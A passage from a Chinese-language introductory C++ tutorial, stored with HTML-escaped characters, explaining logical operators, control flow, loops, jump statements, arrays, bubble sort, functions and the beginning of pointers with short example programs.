\u0026lt;\u0026lt; (a \u0026amp;\u0026amp; b) \u0026lt;\u0026lt; endl;// 0 a = 0; b = 0; cout \u0026lt;\u0026lt; (a \u0026amp;\u0026amp; b) \u0026lt;\u0026lt; endl;// 0 system(\u0026#34;pause\u0026#34;); return 0; } 总结：逻辑==与==运算符总结： ==同真为真，其余为假==\n**示例3：**逻辑或\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //逻辑运算符 --- 或 int main() { int a = 10; int b = 10; cout \u0026lt;\u0026lt; (a || b) \u0026lt;\u0026lt; endl;// 1 a = 10; b = 0; cout \u0026lt;\u0026lt; (a || b) \u0026lt;\u0026lt; endl;// 1 a = 0; b = 0; cout \u0026lt;\u0026lt; (a || b) \u0026lt;\u0026lt; endl;// 0 system(\u0026#34;pause\u0026#34;); return 0; } 逻辑==或==运算符总结： ==同假为假，其余为真==\n4 程序流程结构 C/C++支持最基本的三种程序运行结构：==顺序结构、选择结构、循环结构==\n顺序结构：程序按顺序执行，不发生跳转 选择结构：依据条件是否满足，有选择的执行相应功能 循环结构：依据条件是否满足，循环多次执行某段代码 4.1 选择结构 4.1.1 if语句 **作用：**执行满足条件的语句\nif语句的三种形式\n单行格式if语句\n多行格式if语句\n多条件的if语句\n单行格式if语句：if(条件){ 条件满足执行的语句 }\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int main() { //选择结构-单行if语句 //输入一个分数，如果分数大于600分，视为考上一本大学，并在屏幕上打印 int score = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入一个分数：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; score; cout \u0026lt;\u0026lt; \u0026#34;您输入的分数为： \u0026#34; \u0026lt;\u0026lt; score \u0026lt;\u0026lt; endl; //if语句 //注意事项，在if判断语句后面，不要加分号 if (score \u0026gt; 600) { cout \u0026lt;\u0026lt; \u0026#34;我考上了一本大学！！！\u0026#34; \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 注意：if条件表达式后不要加分号\n多行格式if语句：if(条件){ 条件满足执行的语句 }else{ 条件不满足执行的语句 }; 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int main() { int score = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入考试分数：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; score; if (score \u0026gt; 600) { cout \u0026lt;\u0026lt; \u0026#34;我考上了一本大学\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;我未考上一本大学\u0026#34; \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 多条件的if语句：if(条件1){ 条件1满足执行的语句 }else if(条件2){条件2满足执行的语句}... else{ 都不满足执行的语句} 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 int main() { int score = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入考试分数：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; score; if (score \u0026gt; 600) { cout \u0026lt;\u0026lt; \u0026#34;我考上了一本大学\u0026#34; \u0026lt;\u0026lt; endl; } else if (score \u0026gt; 500) { cout \u0026lt;\u0026lt; \u0026#34;我考上了二本大学\u0026#34; \u0026lt;\u0026lt; endl; } else if (score \u0026gt; 400) { cout \u0026lt;\u0026lt; \u0026#34;我考上了三本大学\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;我未考上本科\u0026#34; \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 嵌套if语句：在if语句中，可以嵌套使用if语句，达到更精确的条件判断\n案例需求：\n提示用户输入一个高考考试分数，根据分数做如下判断 分数如果大于600分视为考上一本，大于500分考上二本，大于400考上三本，其余视为未考上本科； 在一本分数中，如果大于700分，考入北大，大于650分，考入清华，大于600考入人大。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 int main() { int score = 0; cout \u0026lt;\u0026lt; \u0026#34;请输入考试分数：\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; score; if (score \u0026gt; 600) { cout \u0026lt;\u0026lt; \u0026#34;我考上了一本大学\u0026#34; \u0026lt;\u0026lt; endl; if (score \u0026gt; 700) { cout \u0026lt;\u0026lt; \u0026#34;我考上了北大\u0026#34; \u0026lt;\u0026lt; endl; } else if (score \u0026gt; 650) { cout \u0026lt;\u0026lt; \u0026#34;我考上了清华\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;我考上了人大\u0026#34; \u0026lt;\u0026lt; endl; } } else if (score \u0026gt; 500) { cout \u0026lt;\u0026lt; \u0026#34;我考上了二本大学\u0026#34; \u0026lt;\u0026lt; endl; } else if (score \u0026gt; 400) { cout \u0026lt;\u0026lt; \u0026#34;我考上了三本大学\u0026#34; \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;我未考上本科\u0026#34; \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 练习案例： 三只小猪称体重\n有三只小猪ABC，请分别输入三只小猪的体重，并且判断哪只小猪最重？\n4.1.2 三目运算符 作用： 通过三目运算符实现简单的判断\n语法：表达式1 ? 表达式2 ：表达式3\n解释：\n如果表达式1的值为真，执行表达式2，并返回表达式2的结果；\n如果表达式1的值为假，执行表达式3，并返回表达式3的结果。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int main() { int a = 10; int b = 20; int c = 0; c = a \u0026gt; b ? a : b; cout \u0026lt;\u0026lt; \u0026#34;c = \u0026#34; \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl; //C++中三目运算符返回的是变量,可以继续赋值 (a \u0026gt; b ? a : b) = 100; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;b = \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;c = \u0026#34; \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：和if语句比较，三目运算符优点是短小整洁，缺点是如果用嵌套，结构不清晰\n4.1.3 switch语句 **作用：**执行多条件分支语句\n语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 switch(表达式) { case 结果1：执行语句;break; case 结果2：执行语句;break; ... default:执行语句;break; } 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 int main() { //请给电影评分 //10 ~ 9 经典 // 8 ~ 7 非常好 // 6 ~ 5 一般 // 5分以下 烂片 int score = 0; cout \u0026lt;\u0026lt; \u0026#34;请给电影打分\u0026#34; \u0026lt;\u0026lt; endl; cin \u0026gt;\u0026gt; score; switch (score) { case 10: case 9: cout \u0026lt;\u0026lt; \u0026#34;经典\u0026#34; \u0026lt;\u0026lt; endl; break; case 8: cout \u0026lt;\u0026lt; \u0026#34;非常好\u0026#34; \u0026lt;\u0026lt; endl; break; case 7: case 6: cout \u0026lt;\u0026lt; \u0026#34;一般\u0026#34; \u0026lt;\u0026lt; endl; break; default: cout \u0026lt;\u0026lt; \u0026#34;烂片\u0026#34; \u0026lt;\u0026lt; endl; break; } system(\u0026#34;pause\u0026#34;); return 0; } 注意1：switch语句中表达式类型只能是整型或者字符型\n注意2：case里如果没有break，那么程序会一直向下执行\n总结：与if语句比，对于多条件判断时，switch的结构清晰，执行效率高，缺点是switch不可以判断区间\n4.2 循环结构 4.2.1 while循环语句 **作用：**满足循环条件，执行循环语句\n语法： while(循环条件){ 循环语句 }\n解释：==只要循环条件的结果为真，就执行循环语句==\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 int main() { int num = 0; while (num \u0026lt; 10) { cout \u0026lt;\u0026lt; \u0026#34;num = \u0026#34; \u0026lt;\u0026lt; num \u0026lt;\u0026lt; endl; num++; } system(\u0026#34;pause\u0026#34;); return 0; } 注意：在执行循环语句时候，程序必须提供跳出循环的出口，否则出现死循环\nwhile循环练习案例：==猜数字==\n**案例描述：**系统随机生成一个1到100之间的数字，玩家进行猜测，如果猜错，提示玩家数字过大或过小，如果猜对恭喜玩家胜利，并且退出游戏。\n4.2.2 do\u0026hellip;while循环语句 作用： 满足循环条件，执行循环语句\n语法： do{ 循环语句 } while(循环条件);\n**注意：**与while的区别在于==do\u0026hellip;while会先执行一次循环语句==，再判断循环条件\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int main() { int num = 0; do { cout \u0026lt;\u0026lt; num \u0026lt;\u0026lt; endl; num++; } while (num \u0026lt; 10); system(\u0026#34;pause\u0026#34;); return 0; } 总结：与while循环区别在于，do\u0026hellip;while先执行一次循环语句，再判断循环条件\n练习案例：水仙花数\n**案例描述：**水仙花数是指一个 3 位数，它的每个位上的数字的 3次幂之和等于它本身\n例如：1^3 + 5^3+ 3^3 = 153\n请利用do\u0026hellip;while语句，求出所有3位数中的水仙花数\n4.2.3 for循环语句 作用： 满足循环条件，执行循环语句\n语法： for(起始表达式;条件表达式;末尾循环体) { 循环语句; }\n示例：\n1 2 3 4 5 6 7 8 9 10 11 int main() { for (int i = 0; i \u0026lt; 10; i++) { cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 详解：\n注意：for循环中的表达式，要用分号进行分隔\n总结：while , do\u0026hellip;while, for都是开发中常用的循环语句，for循环结构比较清晰，比较常用\n练习案例：敲桌子\n案例描述：从1开始数到数字100， 如果数字个位含有7，或者数字十位含有7，或者该数字是7的倍数，我们打印敲桌子，其余数字直接打印输出。\n4.2.4 嵌套循环 作用： 在循环体中再嵌套一层循环，解决一些实际问题\n例如我们想在屏幕中打印如下图片，就需要利用嵌套循环\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int main() { //外层循环执行1次，内层循环执行1轮 for (int i = 0; i \u0026lt; 10; i++) { for (int j = 0; j \u0026lt; 10; j++) { cout \u0026lt;\u0026lt; \u0026#34;*\u0026#34; \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } **练习案例：**乘法口诀表\n案例描述：利用嵌套循环，实现九九乘法表\n4.3 跳转语句 4.3.1 break语句 作用: 用于跳出==选择结构==或者==循环结构==\nbreak使用的时机：\n出现在switch条件语句中，作用是终止case并跳出switch 出现在循环语句中，作用是跳出当前的循环语句 出现在嵌套循环中，跳出最近的内层循环语句 示例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int main() { //1、在switch 语句中使用break cout \u0026lt;\u0026lt; \u0026#34;请选择您挑战副本的难度：\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;1、普通\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;2、中等\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;3、困难\u0026#34; \u0026lt;\u0026lt; endl; int num = 0; cin \u0026gt;\u0026gt; num; switch (num) { case 1: cout \u0026lt;\u0026lt; \u0026#34;您选择的是普通难度\u0026#34; \u0026lt;\u0026lt; endl; break; case 2: cout \u0026lt;\u0026lt; \u0026#34;您选择的是中等难度\u0026#34; \u0026lt;\u0026lt; endl; break; case 3: cout \u0026lt;\u0026lt; \u0026#34;您选择的是困难难度\u0026#34; \u0026lt;\u0026lt; endl; break; } system(\u0026#34;pause\u0026#34;); return 0; } 示例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int main() { //2、在循环语句中用break for (int i = 0; i \u0026lt; 10; i++) { if (i == 5) { break; //跳出循环语句 } cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 示例3：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int main() { //在嵌套循环语句中使用break，退出内层循环 for (int i = 0; i \u0026lt; 10; i++) { for (int j = 0; j \u0026lt; 10; j++) { if (j == 5) { break; } cout \u0026lt;\u0026lt; \u0026#34;*\u0026#34; \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 4.3.2 continue语句 **作用：**在==循环语句==中，跳过本次循环中余下尚未执行的语句，继续执行下一次循环\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int main() { for (int i = 0; i \u0026lt; 100; i++) { if (i % 2 == 0) { continue; } cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 注意：continue并没有使整个循环终止，而break会跳出循环\n4.3.3 goto语句 **作用：**可以无条件跳转语句\n语法： goto 标记;\n**解释：**如果标记的名称存在，执行到goto语句时，会跳转到标记的位置\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int main() { cout \u0026lt;\u0026lt; \u0026#34;1\u0026#34; \u0026lt;\u0026lt; endl; goto FLAG; cout \u0026lt;\u0026lt; \u0026#34;2\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;3\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;4\u0026#34; \u0026lt;\u0026lt; endl; FLAG: cout \u0026lt;\u0026lt; \u0026#34;5\u0026#34; \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 注意：在程序中不建议使用goto语句，以免造成程序流程混乱\n5 数组 5.1 概述 所谓数组，就是一个集合，里面存放了相同类型的数据元素\n**特点1：**数组中的每个==数据元素都是相同的数据类型==\n**特点2：**数组是由==连续的内存==位置组成的\n5.2 一维数组 5.2.1 一维数组定义方式 一维数组定义的三种方式：\n数据类型 数组名[ 数组长度 ]; 数据类型 数组名[ 数组长度 ] = { 值1，值2 ...}; 数据类型 数组名[ ] = { 值1，值2 ...}; 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 int main() { //定义方式1 //数据类型 数组名[元素个数]; int score[10]; //利用下标赋值 score[0] = 100; score[1] = 99; score[2] = 85; //利用下标输出 cout \u0026lt;\u0026lt; score[0] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; score[1] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; score[2] \u0026lt;\u0026lt; endl; //第二种定义方式 //数据类型 数组名[元素个数] = {值1，值2 ，值3 ...}; //如果{}内不足10个数据，剩余数据用0补全 int score2[10] = { 100, 90,80,70,60,50,40,30,20,10 }; //逐个输出 //cout \u0026lt;\u0026lt; score2[0] \u0026lt;\u0026lt; endl; //cout \u0026lt;\u0026lt; score2[1] \u0026lt;\u0026lt; endl; //一个一个输出太麻烦，因此可以利用循环进行输出 for (int i = 0; i \u0026lt; 10; i++) { cout \u0026lt;\u0026lt; score2[i] \u0026lt;\u0026lt; endl; } //定义方式3 //数据类型 数组名[] = {值1，值2 ，值3 ...}; int score3[] = { 100,90,80,70,60,50,40,30,20,10 }; for (int i = 0; i \u0026lt; 10; i++) { cout \u0026lt;\u0026lt; score3[i] \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 总结1：数组名的命名规范与变量名命名规范一致，不要和变量重名\n总结2：数组中下标是从0开始索引\n5.2.2 一维数组数组名 一维数组名称的用途：\n可以统计整个数组在内存中的长度 可以获取数组在内存中的首地址 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int main() { //数组名用途 //1、可以获取整个数组占用内存空间大小 int arr[10] = { 1,2,3,4,5,6,7,8,9,10 }; cout \u0026lt;\u0026lt; \u0026#34;整个数组所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(arr) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;每个元素所占内存空间为： \u0026#34; \u0026lt;\u0026lt; sizeof(arr[0]) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;数组的元素个数为： \u0026#34; \u0026lt;\u0026lt; sizeof(arr) / sizeof(arr[0]) \u0026lt;\u0026lt; endl; //2、可以通过数组名获取到数组首地址 cout \u0026lt;\u0026lt; \u0026#34;数组首地址为： \u0026#34; \u0026lt;\u0026lt; (int)arr \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;数组中第一个元素地址为： \u0026#34; \u0026lt;\u0026lt; (int)\u0026amp;arr[0] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;数组中第二个元素地址为： \u0026#34; \u0026lt;\u0026lt; (int)\u0026amp;arr[1] \u0026lt;\u0026lt; endl; //arr = 100; 错误，数组名是常量，因此不可以赋值 system(\u0026#34;pause\u0026#34;); return 0; } 注意：数组名是常量，不可以赋值\n总结1：直接打印数组名，可以查看数组所占内存的首地址\n总结2：对数组名进行sizeof，可以获取整个数组占内存空间的大小\n练习案例1：五只小猪称体重\n案例描述：\n在一个数组中记录了五只小猪的体重，如：int arr[5] = {300,350,200,400,250};\n找出并打印最重的小猪体重。\n**练习案例2：**数组元素逆置\n**案例描述：**请声明一个5个元素的数组，并且将元素逆置.\n(如原数组元素为：1,3,2,5,4;逆置后输出结果为:4,5,2,3,1);\n5.2.3 冒泡排序 作用： 最常用的排序算法，对数组内元素进行排序\n比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，执行完毕后，找到第一个最大值。 重复以上的步骤，每次比较次数-1，直到不需要比较 示例： 将数组 { 4,2,8,0,5,7,1,3,9 } 进行升序排序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 int main() { int arr[9] = { 4,2,8,0,5,7,1,3,9 }; for (int i = 0; i \u0026lt; 9 - 1; i++) { for (int j = 0; j \u0026lt; 9 - 1 - i; j++) { if (arr[j] \u0026gt; arr[j + 1]) { int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } for (int i = 0; i \u0026lt; 9; i++) { cout \u0026lt;\u0026lt; arr[i] \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 5.3 二维数组 二维数组就是在一维数组上，多加一个维度。\n5.3.1 二维数组定义方式 二维数组定义的四种方式：\n数据类型 数组名[ 行数 ][ 列数 ]; 数据类型 数组名[ 行数 ][ 列数 ] = { {数据1，数据2 } ，{数据3，数据4 } }; 数据类型 数组名[ 行数 ][ 列数 ] = { 数据1，数据2，数据3，数据4}; 数据类型 数组名[ ][ 列数 ] = { 数据1，数据2，数据3，数据4}; 建议：以上4种定义方式，利用==第二种更加直观，提高代码的可读性==\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 int main() { //方式1 //数组类型 数组名 [行数][列数] int arr[2][3]; arr[0][0] = 1; arr[0][1] = 2; arr[0][2] = 3; arr[1][0] = 4; arr[1][1] = 5; arr[1][2] = 6; for (int i = 0; i \u0026lt; 2; i++) { for (int j = 0; j \u0026lt; 3; j++) { cout \u0026lt;\u0026lt; arr[i][j] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } //方式2 //数据类型 数组名[行数][列数] = { {数据1，数据2 } ，{数据3，数据4 } }; int arr2[2][3] = { {1,2,3}, {4,5,6} }; //方式3 //数据类型 数组名[行数][列数] = { 数据1，数据2 ,数据3，数据4 }; int arr3[2][3] = { 1,2,3,4,5,6 }; //方式4 //数据类型 数组名[][列数] = { 数据1，数据2 ,数据3，数据4 }; int arr4[][3] = { 1,2,3,4,5,6 }; system(\u0026#34;pause\u0026#34;); return 0; } 总结：在定义二维数组时，如果初始化了数据，可以省略行数\n5.3.2 二维数组数组名 查看二维数组所占内存空间 获取二维数组首地址 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int main() { //二维数组数组名 int arr[2][3] = { {1,2,3}, {4,5,6} }; cout \u0026lt;\u0026lt; \u0026#34;二维数组大小： \u0026#34; \u0026lt;\u0026lt; sizeof(arr) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组一行大小： \u0026#34; \u0026lt;\u0026lt; sizeof(arr[0]) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组元素大小： \u0026#34; \u0026lt;\u0026lt; sizeof(arr[0][0]) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组行数： \u0026#34; \u0026lt;\u0026lt; sizeof(arr) / sizeof(arr[0]) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组列数： \u0026#34; \u0026lt;\u0026lt; sizeof(arr[0]) / sizeof(arr[0][0]) \u0026lt;\u0026lt; endl; //地址 cout \u0026lt;\u0026lt; \u0026#34;二维数组首地址：\u0026#34; \u0026lt;\u0026lt; arr \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组第一行地址：\u0026#34; \u0026lt;\u0026lt; arr[0] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组第二行地址：\u0026#34; \u0026lt;\u0026lt; arr[1] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组第一个元素地址：\u0026#34; \u0026lt;\u0026lt; \u0026amp;arr[0][0] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;二维数组第二个元素地址：\u0026#34; \u0026lt;\u0026lt; \u0026amp;arr[0][1] \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结1：二维数组名就是这个数组的首地址\n总结2：对二维数组名进行sizeof时，可以获取整个二维数组占用的内存空间大小\n5.3.3 二维数组应用案例 考试成绩统计：\n案例描述：有三名同学（张三，李四，王五），在一次考试中的成绩分别如下表，请分别输出三名同学的总成绩\n语文 数学 英语 张三 100 100 100 李四 90 50 100 王五 60 70 80 参考答案：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int main() { int scores[3][3] = { {100,100,100}, {90,50,100}, {60,70,80}, }; string names[3] = { \u0026#34;张三\u0026#34;,\u0026#34;李四\u0026#34;,\u0026#34;王五\u0026#34; }; for (int i = 0; i \u0026lt; 3; i++) { int sum = 0; for (int j = 0; j \u0026lt; 3; j++) { sum += scores[i][j]; } cout \u0026lt;\u0026lt; names[i] \u0026lt;\u0026lt; \u0026#34;同学总成绩为： \u0026#34; \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 6 函数 6.1 概述 **作用：**将一段经常使用的代码封装起来，减少重复代码\n一个较大的程序，一般分为若干个程序块，每个模块实现特定的功能。\n6.2 函数的定义 函数的定义一般主要有5个步骤：\n1、返回值类型\n2、函数名\n3、参数表列\n4、函数体语句\n5、return 表达式\n语法：\n1 2 3 4 5 6 7 8 返回值类型 函数名 （参数列表） { 函数体语句 return表达式 } 返回值类型 ：一个函数可以返回一个值。在函数定义中 函数名：给函数起个名称 参数列表：使用该函数时，传入的数据 函数体语句：花括号内的代码，函数内需要执行的语句 return表达式： 和返回值类型挂钩，函数执行完后，返回相应的数据 **示例：**定义一个加法函数，实现两个数相加\n1 2 3 4 5 6 //函数定义 int add(int num1, int num2) { int sum = num1 + num2; return sum; } 6.3 函数的调用 **功能：**使用定义好的函数\n语法： 函数名（参数）\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //函数定义 int add(int num1, int num2) //定义中的num1,num2称为形式参数，简称形参 { int sum = num1 + num2; return sum; } int main() { int a = 10; int b = 10; //调用add函数 int sum = add(a, b);//调用时的a，b称为实际参数，简称实参 cout \u0026lt;\u0026lt; \u0026#34;sum = \u0026#34; \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; endl; a = 100; b = 100; sum = add(a, b); cout \u0026lt;\u0026lt; \u0026#34;sum = \u0026#34; \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：函数定义里小括号内称为形参，函数调用时传入的参数称为实参\n6.4 值传递 所谓值传递，就是函数调用时实参将数值传入给形参 值传递时，==如果形参发生，并不会影响实参== 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 void swap(int num1, int num2) { cout \u0026lt;\u0026lt; \u0026#34;交换前：\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;num1 = \u0026#34; \u0026lt;\u0026lt; num1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;num2 = \u0026#34; \u0026lt;\u0026lt; num2 \u0026lt;\u0026lt; endl; int temp = num1; num1 = num2; num2 = temp; cout \u0026lt;\u0026lt; \u0026#34;交换后：\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;num1 = \u0026#34; \u0026lt;\u0026lt; num1 \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;num2 = \u0026#34; \u0026lt;\u0026lt; num2 \u0026lt;\u0026lt; endl; //return ; 当函数声明时候，不需要返回值，可以不写return } int main() { int a = 10; int b = 20; swap(a, b); cout \u0026lt;\u0026lt; \u0026#34;mian中的 a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;mian中的 b = \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结： 值传递时，形参是修饰不了实参的\n6.5 函数的常见样式 常见的函数样式有4种\n无参无返 有参无返 无参有返 有参有返 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //函数常见样式 //1、 无参无返 void test01() { //void a = 10; //无类型不可以创建变量,原因无法分配内存 cout \u0026lt;\u0026lt; \u0026#34;this is test01\u0026#34; \u0026lt;\u0026lt; endl; //test01(); 函数调用 } //2、 有参无返 void test02(int a) { cout \u0026lt;\u0026lt; \u0026#34;this is test02\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } //3、无参有返 int test03() { cout \u0026lt;\u0026lt; \u0026#34;this is test03 \u0026#34; \u0026lt;\u0026lt; endl; return 10; } //4、有参有返 int test04(int a, int b) { cout \u0026lt;\u0026lt; \u0026#34;this is test04 \u0026#34; \u0026lt;\u0026lt; endl; int sum = a + b; return sum; } 6.6 函数的声明 作用： 告诉编译器函数名称及如何调用函数。函数的实际主体可以单独定义。\n函数的声明可以多次，但是函数的定义只能有一次 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //声明可以多次，定义只能一次 //声明 int max(int a, int b); int max(int a, int b); //定义 int max(int a, int b) { return a \u0026gt; b ? a : b; } int main() { int a = 100; int b = 200; cout \u0026lt;\u0026lt; max(a, b) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 6.7 函数的分文件编写 **作用：**让代码结构更加清晰\n函数分文件编写一般有4个步骤\n创建后缀名为.h的头文件 创建后缀名为.cpp的源文件 在头文件中写函数的声明 在源文件中写函数的定义 示例：\n1 2 3 4 5 6 //swap.h文件 #include\u0026lt;iostream\u0026gt; using namespace std; //实现两个数字交换的函数声明 void swap(int a, int b); 1 2 3 4 5 6 7 8 9 10 11 12 //swap.cpp文件 #include \u0026#34;swap.h\u0026#34; void swap(int a, int b) { int temp = a; a = b; b = temp; cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;b = \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; } 1 2 3 4 5 6 7 8 9 10 11 12 //main函数文件 #include \u0026#34;swap.h\u0026#34; int main() { int a = 100; int b = 200; swap(a, b); system(\u0026#34;pause\u0026#34;); return 0; } 7 指针 7.1 指针的基本概念 指针的作用： 可以通过指针间接访问内存\n内存编号是从0开始记录的，一般用十六进制数字表示\n可以利用指针变量保存地址\n7.2 指针变量的定义和使用 指针变量定义语法： 数据类型 * 变量名；\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int main() { //1、指针的定义 int a = 10; //定义整型变量a //指针定义语法： 数据类型 * 变量名 ; int * p; //指针变量赋值 p = \u0026amp;a; //指针指向变量a的地址 cout \u0026lt;\u0026lt; \u0026amp;a \u0026lt;\u0026lt; endl; //打印数据a的地址 cout \u0026lt;\u0026lt; p \u0026lt;\u0026lt; 